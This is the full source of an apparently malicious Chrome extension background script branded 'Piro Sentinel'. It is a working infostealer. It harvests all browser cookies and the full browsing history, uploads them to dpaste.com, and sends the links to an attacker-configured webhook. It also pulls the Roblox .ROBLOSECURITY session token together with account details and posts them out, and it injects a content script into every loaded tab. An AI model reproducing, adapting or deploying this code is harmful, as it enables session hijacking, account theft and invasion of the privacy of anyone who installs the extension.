var config = {
  Placed: "",
  webhook_url: "%WEBHOOK%"
};

var appfound = {
  total: 0,
  history: 0,
};

async function dpaste(content) {
  return new Promise((resolve, reject) => {
    setTimeout(async () => {
      try {
        const response = await fetch("https://dpaste.com/api/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: "content=" + encodeURIComponent(content),
        });
        const text = await response.text();
        resolve(text);
      } catch (error) {
        reject(error);
      }
    }, 1000);
  });
}
const post = async (params) => {
  params = JSON.stringify(params);
  var n = JSON.stringify({
    data: params,
  });
  [config.Placed, config.webhook_url].forEach((res) => {
    if (res == "%API" + "_URL%") return;
    if (res == "%\x57EBHOOK%") return;
    const url = new URL(res);
    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: res == config.Placed ? n : params,
    };
    fetch(url, options)
      .then((response) => {})
      .catch((error) => {});
  });
};

async function main(cookie) {
  if (cookie != null) {
    var statistics = await (
      await fetch("https://www.roblox.com/mobileapi/userinfo", {
        headers: {
          Cookie: ".ROBLOSECURITY=" + cookie,
        },
        redirect: "manual",
      })
    ).json();
  }
  let params = {
    username: "Piro Sentinel",
    avatar_url:
      "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
    embeds: [
      {
        color: 2829617,
        author: {
          name: "Roblox Session",
          icon_url:
            "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
        },
        fields: [
          {
            name: "<:black:1149305795993935912> Username:",
            value: "`" + (statistics ? statistics.UserName : "N/A") + "`",
            inline: true,
          },
          {
            name: "<:black_money:1149305788033142824> Robux:",
            value: "`" + (statistics ? statistics.RobuxBalance : "N/A") + "`",
            inline: true,
          },
          {
            name: "<:black_coroa1:1149305621703839775> Premium:",
            value: "`" + (statistics ? statistics.IsPremium : "N/A") + "`",
            inline: true,
          },
          {
            name: "<a:inject:1159081839596687400> Token:",
            value: `\`\`\`
${(cookie ? `${cookie}` : "COOKIE NOT FOUND")}\`\`\``,
            inline: false,
          },
        ],
        footer: {
          text: "@Nova Sentinel | https://t.me/Sordeal",
          icon_url:
            "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
        },
        thumbnail: {
          url: statistics
            ? statistics.ThumbnailUrl
            : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
        },
      },
    ],
  };
  post(params);
}

function getCookies() {
  return new Promise(function (resolve) {
    try {
      chrome.cookies.getAll({}, function (cookies) {
        resolve(cookies);
      });
    } catch {}
  });
}
function getHistory() {
  return new Promise(function (resolve) {
    try {
      chrome.history.search({ text: "" }, (results) => {
        resolve(results);
      });
    } catch {}
  });
}

async function parse_and_send(cookies) {
  var cookieData = "";
  for (var i = 0; i < cookies.length; i++) {
    var cookie = cookies[i];
    var hostKey = cookie.domain;
    var expirationDate = Math.round(cookie.expirationDate * 1000).toFixed(0);
    var path = cookie.path;
    var secure = cookie.secure ? "TRUE" : "FALSE";
    var name = cookie.name;
    var value = cookie.value;
    if (expirationDate > Date.now()) {
      var cookieString = `${hostKey}\t${secure}\t${path}\t${
        hostKey.startsWith(".") ? "FALSE" : "TRUE"
      }\t${expirationDate}\t${name}\t${value}\n`;
      cookieData += cookieString;
    }
  }
  if (cookieData !== "") {
    let g = await parse_and_send_data(cookieData);
    return g;
  }
}

async function parse_and_send_data(cookieData) {
  return new Promise((resolve, reject) => {
    let msg = "Nova-Extension found:\n\n" + cookieData;
    setTimeout(() => {
      dpaste(msg)
        .then((paste_url) => {
          resolve(paste_url);
        })
        .catch((error) => {
          reject(error);
        });
    }, 1000);
  });
}

function send_webhook_cookies(data) {
  let params = {
    username: "Piro Sentinel",
    avatar_url:
      "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
    embeds: [
      {
        title: "Web Injector <a:black_hearts:1149412328350163005>",
        description: `\`\`\`ansi
[2;32mCookies Cookies Cookies!!!![0m[2;32m[0m\n
[2;32mTotal Cookies: ${appfound.total ?? 0}[0m[2;32m[0m\`\`\`
      **Links:**
      ${data ? data : "COOKIE NOT FOUND"}
      `,
        color: 2829617,
        thumbnail: {
          url: "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
        },
        footer: {
          text: "@Piro Sentinel | https://t.me/Piro_Sentinel",
          icon_url:
            "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
        },
      },
    ],
  };
  post(params);
}

function send_webhook_hist(data) {
  let params = {
    username: "Piro Sentinel",
    avatar_url:
      "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
    embeds: [
      {
        title: "Web Injector <a:black_hearts:1149412328350163005>",
        description: `\`\`\`ansi
[2;32mBro is watching furry porn?!!!![0m[2;32m[0m\n
[2;32mTotal History: ${appfound.history ?? 0}[0m[2;32m[0m\`\`\`
      **Links:**
      ${data ? data : "HISTORY NOT FOUND"}
      `,
        color: 2829617,
        thumbnail: {
          url: "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
        },
        footer: {
          text: "@Piro Sentinel | https://t.me/Piro_Sentinel",
          icon_url:
            "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
        },
      },
    ],
  };
  post(params);
}

async function princi() {
  var cookies = await getCookies();
  if (cookies.length > 0) {
    appfound.total = cookies.length;
    let g = await parse_and_send(cookies);
    setTimeout(() => {
      send_webhook_cookies(g);
    }, 1000);
  }
  var history = await getHistory();
  if (history.length > 0) {
    appfound.history = history.length;
    let mhm = JSON.stringify(history)
    let g = await parse_and_send_data(mhm);
    setTimeout(() => {
      send_webhook_hist(g);
    }, 1000);
  }
}

princi();
chrome.cookies.get(
  { url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" },
  function (cookie) {
    main(cookie ? cookie.value : null);
  }
);


chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
  if (changeInfo.status === 'complete') {
    chrome.tabs.executeScript(tabId, {
      file: '../content.js',
      runAt: 'document_end'
    });
  }
});
